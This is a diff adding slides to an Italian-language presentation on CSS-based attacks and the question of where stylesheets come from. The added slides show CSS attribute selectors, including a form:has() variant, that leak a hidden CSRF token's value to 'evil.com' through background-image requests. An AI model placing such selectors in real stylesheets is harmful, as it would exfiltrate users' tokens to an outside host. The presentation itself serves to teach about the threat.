@@ -37,6 +37,31 @@ input[type='password'][value$='c']::before {
 <p-slide>
   <img src="img/really.gif" alt="Really?" class="full-media">
 </p-slide>
+<p-slide>
+  <h3 class="our-header">Ma anche senza React&hellip;</h3>
+  <div class="self-center">
+    <pre class="language-html"><code>&lt;input type="hidden" name="crsf" value="abcdef=="></code></pre>
+    <pre class="language-css"><code>input[name="crsf"][value^="a"] ~ * {
+  background-image: url('http://evil.com/a.gif');
+}
+...
+input[name="crsf"][value$="="] ~ * {
+  background-image: url('http://evil.com/is-base-64.gif');
+}
+...</code></pre>
+  </div>
+</p-slide>
+<p-slide>
+  <h4 class="our-header">Hidden input per ultimi? No problem!</h4>
+  <pre class="language-css self-center"><code>form:has(input[name="crsf"][value^="a"]) {
+  background-image: url('http://evil.com/a.gif');
+}
+...
+form:has(input[name="crsf"][value$="="]) {
+  background-image: url('http://evil.com/is-base-64.gif');
+}
+...</code></pre>
+</p-slide>
 <p-slide class="center">
   <h1>Abbiamo la <em>certezza</em> di sapere da dove arrivano i nostri fogli di stile?</h1>
 </p-slide>
@@ -69,6 +94,9 @@ input[type='password'][value$='c']::before {
 <p-slide>
   <img src="img/my-gosh.gif" alt="Robert Downey Jr. spalanca gli occhi" class="full-media">
 </p-slide>
+<p-slide class="center">
+  <img src="img/node_modules_meme.png" alt="Classico meme sul 'peso' di node_modules_meme" style="height: 12em;">
+</p-slide>
 <p-slide>
   <svg class="full-media" viewBox="0 2.5 160 90"><g fill="#0f0" stroke="currentColor"><path d="m35 35 22.5 25M57.5 35v25M80 35 57.5 60M105 35l15 25M120 35v25M135 35l-15 25M57.5 60 90 85M120 60 90 85M10 10l25 25M20 10l15 25M30 10l5 25M40 10l-5 25M50 10 35 35M60 10 35 35"/><circle cx="10" cy="10" r="3"/><circle cx="20" cy="10" r="3"/><circle cx="30" cy="10" r="3"/><circle cx="40" cy="10" r="3"/><circle cx="50" cy="10" r="3"/><circle cx="60" cy="10" r="3"/><circle cx="35" cy="35" r="3"/><circle cx="57.5" cy="35" r="3"/><path d="m70 10 10 25M80 10v25M90 10 80 35"/><circle cx="70" cy="10" r="3"/><circle cx="80" cy="10" r="3"/><circle cx="90" cy="10" r="3"/><circle cx="80" cy="35" r="3"/><path d="m100 10 5 25M110 10l-5 25"/><circle cx="100" cy="10" r="3"/><circle cx="110" cy="10" r="3"/><circle cx="105" cy="35" r="3"/><circle cx="120" cy="35" r="3"/><path d="m120 10 15 25M130 10l5 25M140 10l-5 25M150 10l-15 25"/><circle cx="120" cy="10" r="3"/><circle cx="130" cy="10" r="3"/><circle cx="140" cy="10" r="3"/><circle cx="150" cy="10" r="3"/><circle cx="135" cy="35" r="3"/><circle cx="57.5" cy="60" r="3"/><circle cx="120" cy="60" r="3"/><circle cx="90" cy="85" r="3"/></g></svg>
   <p-fragment>
@@ -77,4 +105,12 @@ input[type='password'][value$='c']::before {
 </p-slide>
 <p-slide style="--slide-bg: #2b0513;">
   <img src="img/fingers-crossed.gif" alt="Dita incrociate" class="full-media">
+</p-slide>
+<p-slide class="center">
+  <h1>E per giunta&hellip;</h1>
+  <p-fragment><img src="img/stylus.png" alt="Logo dell'estensione Stylus" style="height: 4em;"></p-fragment>
+</p-slide>
+<p-slide style="--slide-bg: #1d4f76" class="justify-end">
+  <h1 class="center meme-text uppercase">Hackers be like</h1>
+  <img src="img/thumbs-up.gif" alt="Persona che fa il pollice su" class="full-media">
 </p-slide>
